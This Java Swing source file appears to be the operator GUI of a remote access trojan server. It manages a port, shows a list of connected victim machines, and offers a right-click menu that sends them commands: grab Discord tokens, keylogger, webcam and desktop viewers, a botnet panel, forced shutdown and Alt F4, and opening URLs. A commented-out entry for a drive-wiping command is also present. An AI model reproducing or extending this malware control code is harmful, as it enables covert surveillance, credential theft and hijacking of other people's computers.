package me.sebsb.gui;

import java.awt.Color;
import java.awt.Font;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.text.NumberFormat;
import java.util.ArrayList;
import java.util.List;

import javax.swing.DefaultListModel;
import javax.swing.JButton;
import javax.swing.JFormattedTextField;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.SwingConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.border.LineBorder;
import javax.swing.text.NumberFormatter;

import me.sebsb.ConnectedClient;
import me.sebsb.Server;
import me.sebsb.utils.MessageType;
import me.sebsb.utils.NetUtils;
import me.sebsb.utils.Packet;

public class GuiMain extends JFrame {

	private JPanel mainPanel;
	private Server parent;
	private JLabel label;
	private DefaultListModel<ConnectedClient> model;
	
	private JList<ConnectedClient> clientList;
	private int port = -1;
	
	public int getPort() {
		return port;
	}
	
	public GuiMain(Server parent) {
		this.parent = parent;
		
		setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		setBounds(100, 100, 668, 448);
		mainPanel = new JPanel();
		mainPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(mainPanel);
		mainPanel.setLayout(null);
		
		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(6, 5, 656, 364);
		mainPanel.add(tabbedPane);
		
		JPanel portSelector = new JPanel();
		portSelector.setBorder(new LineBorder(new Color(0, 0, 0), 1, true));
		tabbedPane.addTab("Ports", null, portSelector, null);
		portSelector.setLayout(null);
		
		JLabel lblNewLabel = new JLabel("Enter the port that you want to use:");
		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
		lblNewLabel.setBounds(6, 6, 623, 16);
		portSelector.add(lblNewLabel);
		
	    NumberFormat format = NumberFormat.getInstance();
	    format.setGroupingUsed(false);
	    NumberFormatter formatter = new NumberFormatter(format);
	    formatter.setValueClass(Integer.class);
	    formatter.setMinimum(0);
	    formatter.setMaximum(65535);
	    formatter.setAllowsInvalid(false);
	    formatter.setCommitsOnValidEdit(true);
		JFormattedTextField formattedTextField = new JFormattedTextField(formatter);
		formattedTextField.setFont(new Font("Lucida Grande", Font.PLAIN, 80));
		formattedTextField.setHorizontalAlignment(SwingConstants.CENTER);
		formattedTextField.setBounds(6, 34, 623, 163);
		portSelector.add(formattedTextField);
		
		JButton update = new JButton("Update Port");
		update.addActionListener(new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent e) {
				port = (int) formattedTextField.getValue();
				updateInfo();
				parent.changePort(port);
			}
			
		});
		update.setBounds(6, 209, 623, 103);
		portSelector.add(update);
		
		JScrollPane clients = new JScrollPane();
		tabbedPane.addTab("Clients", null, clients, null);
		
		model = new DefaultListModel<ConnectedClient>();
		clientList = new JList<ConnectedClient>(model);
		this.popupMenu();
		clients.setViewportView(clientList);
		
		JPanel infoPanel = new JPanel();
		infoPanel.setBorder(new LineBorder(new Color(0, 0, 0), 1, true));
		infoPanel.setBounds(6, 375, 656, 45);
		mainPanel.add(infoPanel);
		infoPanel.setLayout(null);
		
		label = new JLabel("Port: -1 | Clients Connected: 0");
		label.setBounds(6, 6, 644, 33);
		label.setHorizontalAlignment(SwingConstants.CENTER);
		infoPanel.add(label);
		
		setVisible(true);
	}
	
	private GuiMessageBox messageBox;
	private GuiBotnet botnet;
	private GuiOpenURL openUrl;
	
	public void popupMenu() {
		JPopupMenu jPopupMenu = new JPopupMenu();
        jPopupMenu.add(createAction("Grab Token", MessageType.DISCORD));
        jPopupMenu.add(createAction("Alt F4", MessageType.ALTF4));
        jPopupMenu.add(createAction("Message Box", MessageType.MESSAGE_BOX, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				if (messageBox == null) {
					messageBox = new GuiMessageBox(clientList);
				}
				
				messageBox.setVisible(true);
			}
        	
        }));
        jPopupMenu.add(createAction("Bot Net", MessageType.BOTNET, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				if (botnet == null) {
					botnet = new GuiBotnet();
				}
				
				botnet.setVisible(true);
			}
        	
        }));
        jPopupMenu.add(createAction("Desktop Viewer", MessageType.DESKTOP, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
					cc.openDesktopView();
				}
			}
        	
        }));
        jPopupMenu.add(createAction("Webcam Viewer", MessageType.WEBCAM, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
					cc.openWebcamView();
				}
			}
        	
        }));
        jPopupMenu.add(createAction("Key Logger", MessageType.KEYLOGGER, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
					cc.openKeyLogView();
				}
			}
        	
        }));
        //jPopupMenu.add(createAction("Drive Fucker", MessageType.DRIVEFUCKER));
        jPopupMenu.add(createAction("Shutdown", MessageType.SHUTDOWN));
        jPopupMenu.add(createAction("Open URL", MessageType.OPEN_URL, new ActionListener() {

			@Override
			public void actionPerformed(ActionEvent arg0) {
				if (openUrl == null) {
					openUrl = new GuiOpenURL(clientList);
				}
				
				openUrl.setVisible(true);
			}
        	
        }));
        
        clientList.addMouseListener(new MouseAdapter() {
			public void mousePressed(MouseEvent e)  {check(e);}
			public void mouseReleased(MouseEvent e) {check(e);}

			public void check(MouseEvent e) {
			    if (e.isPopupTrigger()) {
			    	clientList.setSelectedIndex(clientList.locationToIndex(e.getPoint()));
			        jPopupMenu.show(clientList, e.getX(), e.getY());
			    }
			}
		});

		clientList.setComponentPopupMenu(jPopupMenu);
	}
	
	public JMenuItem createAction(String name, MessageType action) {
		JMenuItem item = new JMenuItem(name);
		item.addActionListener(new ActionListener() {   	 
			public void actionPerformed(ActionEvent e) {
				Packet packet = new Packet();
				packet.action = action.getID();
				for (ConnectedClient cc : clientList.getSelectedValuesList()) {
					try {
						NetUtils.sendMessage(packet, cc.getPrintWriter());
					} catch (Exception e1) {
						e1.printStackTrace();
					}
				}
			}
		});
		return item;
	}
	
	public JMenuItem createAction(String name, MessageType action, ActionListener listener) {
		JMenuItem item = new JMenuItem(name);
		item.addActionListener(listener);
		return item;
	}

	public void updateInfo() {
		label.setText("Port: " + this.port + " | Clients Connected: " + this.parent.getClients().size());
		List<ConnectedClient> list = new ArrayList<ConnectedClient>();
		for(int i = 0; i< this.clientList.getModel().getSize();i++){
			list.add(this.clientList.getModel().getElementAt(i));
        }
		int index = 0;
		for (ConnectedClient c : this.parent.getClients()) {
			if (!list.contains(c)) {
				this.model.add(index, c);
			}
			index++;
		}
		int count = 0;
		for (ConnectedClient c : list) {
			if (!this.parent.getClients().contains(c)) {
				this.model.remove(count);
				continue;
			}
			count++;
		}
	}
}
